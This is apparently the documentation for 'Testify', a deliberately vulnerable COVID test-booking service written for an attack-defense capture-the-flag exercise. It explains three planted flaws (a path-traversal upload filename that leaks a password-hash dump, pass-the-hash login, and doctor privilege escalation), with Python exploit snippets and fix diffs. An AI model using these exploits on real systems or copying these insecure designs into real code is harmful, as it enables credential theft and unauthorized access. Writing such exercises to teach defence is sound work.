<ins>Testify Service documentation
======================
# <ins>Basic functionality

The Homepage of Testify briefly informs you about the basic concept of this service. 
After the user is registered/logged in, he is able to make COVID-19 rapid test appointments.
The registration can be done directly from the Homepage using the `Signup` Button in the Login Section.
After a successful login, the user gets redirected _Appointments_ page.

### Appointments-Section [ <ins>/appointments]
To make an appointment, a bunch of fields need to be filled. While most of the input is self-explanatory, the user also has
to choose one of the 5 doctors and can provide an _extra info_ (Flagstore #2) for the doctor. The user also sets an Appointment PIN
which is needed to view the _extra information_ (needed for checker getflag). This Appointment PIN is mandatory as the _extra info_
cannot be viewed by simply logging in with the user credentials because this would mix up the two Flagstores. Lastly, the user
can upload an optional file for identity verification purposes (important for Flagstore #1 and VULN #1). After all necessary fields
have been submitted, the appointment is made and a success notification with the just created appointment ID is displayed.
The user will also be able to see all his previously created appointments right below the appointment form (important for
Flagstore #1). This functionality is havoc'd.

### Appointment-Info [ <ins>/appointment_info]
As mentioned in the previuos paragraph, the user (and checker) can retrieve the given _appointment extra info_ using the 
generated appointment ID and the chosen Appointment PIN. This can be done by simply submitting both values to the `/appointment_info` page.
This functionality is havoc'd.

### Restore Username [ <ins>/restore_username]
If the user has forgotten his username, he is able to submit his email address to the `/restore_username` page and his
username will be returned. This is a on-top function which is not needed for the basic usage or any of the flagstores but is
still havoc'd.

### About Page [ <ins>/about]
The about page simply displays the last 1000 users of the DB ordered by the most recently created ones. They are separated by a ` - `.
The user list is created by a mysqldump-call on the DB using a low-privileged user creating a `dump.sql` file every time the 
`/about` page is loaded. The dump command however, excludes the doctors as this would lead to a mix of both flagstores.
The frontend simply reads the users from the file. This functionality is havoc'd.

### Doctor's Page [ <ins>/doctors]
The doctor's page is the entrypoint users that are also doctors. This page can only be viewed if the user that is currently logged
in is a doctor otherwise one is immediately redirected to the homepage without an error message. When authenticated as a doctor,
one is able to simply submit the username of any user and the frontend will return a list of the users appointments containing a
column for the chosen doctor and the _extra info_ (important for Flagstore #2). This functionality is havoc'd.


# <ins>Vulnerabilities (3)

The Testify Service consists of three different Vulnerabilities. Two of them must be exploited after each other to access FLAGSTORE #1.
The third VULN leads to FLAGSTORE #2

## VULN #1: User Password Hash Exposure

- Category: Sensitive Data Exposure
- Difficulty: Medium

When registering a new user, a `.sql` dump file of the user database containing the password hashes is created.  
The attacker can retrieve this dump file by using a modified file name when uploading his ID in the appointments
section.

## VULN #2: Pass-The-Hash

- Category: Authentication
- Difficulty: Medium

The password is not allowed to contain any special characters other than ASCII. If the user passes a password string,
that does include non-ASCII characters (*e.g. a password hash obtained by VULN#1*) the hashing of the input password
string is skipped and directly compared to the hash in the user credential databse.


## VULN #3 User Privilege Escalation

- Category: User Privelege Administration
- Difficulty: Easy

When a user makes an appointment, an additional info for the doctor is submitted optionally (FLAGSTORE). This info can only
be viewed by a doctor having set the `is_doctor` attribute in the DB (doctor01,...,doctor05). However the `check_doctor()` 
function also checks whether the accessing user shows up as a assigned doctor in the `appointment` table of the DB. If so, 
the user is also considered a doctor and access to the info field (FLAGSTORE) of any user is granted.

# <ins>Exploits

Two different exploits for VULN#1 and VULN#2 need to be run after each other to obtain a flag.

## VULN #1 :

1. Make an appointment containing a file with arbitrary content but using the filename `../online_users/dump.sql`
2. In the appointments overview section: Use the *Download ID* button to download the hijacked `dump.sql` file

### Code

```
        self.register(username, password)
        self.http_get('/about')
        
        filename = '../online_users/dump.sql'

        app_id = self.make_appointment(prename, lastname, filename, date, time, file, 'doctor0' + str(random.randint(1, 5)), pin)
        route = '/get_id' + str(app_id)

        kwargs = {
            'allow_redirects': True
        }

        res = self.http_get(route, **kwargs)
        sql_string = res.content.decode('ascii').splitlines()
        user_list = [i.split(',')[1:3] for i in sql_string]
```

## VULN #2 :

1. Retrieve a user/hash pair from .sql dump file using VULN #1
2. Pass this hash as base64 to `/login` route.
3. Search response appointment content for flag

### Code

```
    def pass_the_hash(user, hash):
        obj = {
                'username': user,
                'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                'login': 'signin'
        }
        req = requests.post('http://localhost:8597/login', data=obj)
        return req.text
```

## VULN #3 :

1. Create appointment with a new user while stating this newly created user as the doctor in the make_appointment form (using POST-request)
2. Access the `/doctors` page to retrieve the info for the users returned by `/about` page 

### Code

```
    self.register(username, password)

    app_id = self.make_appointment(prename, lastname, filename, date, time, file, username, pin)

    text = self.http_get('/about').text
    splits = text[text.find('onlineUsers'):].split('&#39;')
    splits = splits[1:]
    del splits[1::2]
    for s in splits:
        kwargs = {'data': {'patient_username': s},
                  'allow_redirects': True}
        pot_flag = self.http_post('/doctors', **kwargs)

        if flag := self.search_flag(pot_flag.text):
            return flag
```


# <ins>Fixes

## VULN #1 :
The fix for VULN #1 simply consits of adding the `/ids` path to the checking path in the `get_path` function. This does not
allow the attacker to store/retrieve any data outside the `/ids` directory. The attacker could still overwrite files from other users
this however does not grant him access to the flagstore.

### Fix:
```
diff --git a/service/App/src/appointments_manager.py b/service/App/src/appointments_manager.py
--- a/service/App/src/appointments_manager.py
+++ b/service/App/src/appointments_manager.py
@@ -65,7 +65,7 @@
 
 def get_path(path: str):
     if path:
-        basedir = os.path.abspath("user_data/")
+        basedir = os.path.abspath("user_data/ids")
         path_comp = 'user_data/ids/' + path
         matchpath = os.path.abspath(path_comp)
         if matchpath.startswith(basedir) and basedir == os.path.commonpath((basedir, matchpath)):
         
         
```

## VULN #2 :
The fix for VULN #2 is done by skipping the check of non-ascii characters in the password causing the hash-function
to be executed everytime and not only when no non-ascii characters are found in the password submitted by the user.

### Fix:
```
diff --git a/service/App/src/userDBConnecter.py b/service/App/src/userDBConnecter.py
--- a/service/App/src/userDBConnecter.py
+++ b/service/App/src/userDBConnecter.py
@@ -51,11 +51,7 @@
 
 
 def get_hash(string, salt):
-    if isValid(string):
-        return hashlib.pbkdf2_hmac('sha256', string, salt, 100000)
-    else:
-        return string
-
+    return hashlib.pbkdf2_hmac('sha256', string, salt, 100000)
 
 def isValid(password) -> bool:
     try:

```

## VULN #3 :
To fix VULN #3 one has to remove the second if condition from the SQL Query checking the doctors. The query needs to be
modified so that only the `is_doctor` field is checked and not whether the user has any assigned appointments. Alternatively,
one could also check whether the submitted doctor in the `make_appointment` function is a valid doctor _(doctor01, ..., doctor05)_.

### Fix:
```
diff --git a/service/App/src/doctor.py b/service/App/src/doctor.py
--- a/service/App/src/doctor.py
+++ b/service/App/src/doctor.py
@@ -16,9 +16,7 @@
 def check_doctor(username: str) -> bool:
     connector = get_connector()
     cursor = connector.cursor()
-    cursor.execute("SELECT IF ((SELECT is_doctor FROM user_database.users WHERE username = %s) OR (SELECT "
-                   "EXISTS(SELECT * FROM user_database.appointments WHERE user_database.appointments.doctor = "
-                   "%s)), 1, 0)", (username, username))
+    cursor.execute("SELECT is_doctor FROM user_database.users WHERE username = %s", (username,))
     res = cursor.fetchone()
     return True if res[0] == 1 else False

```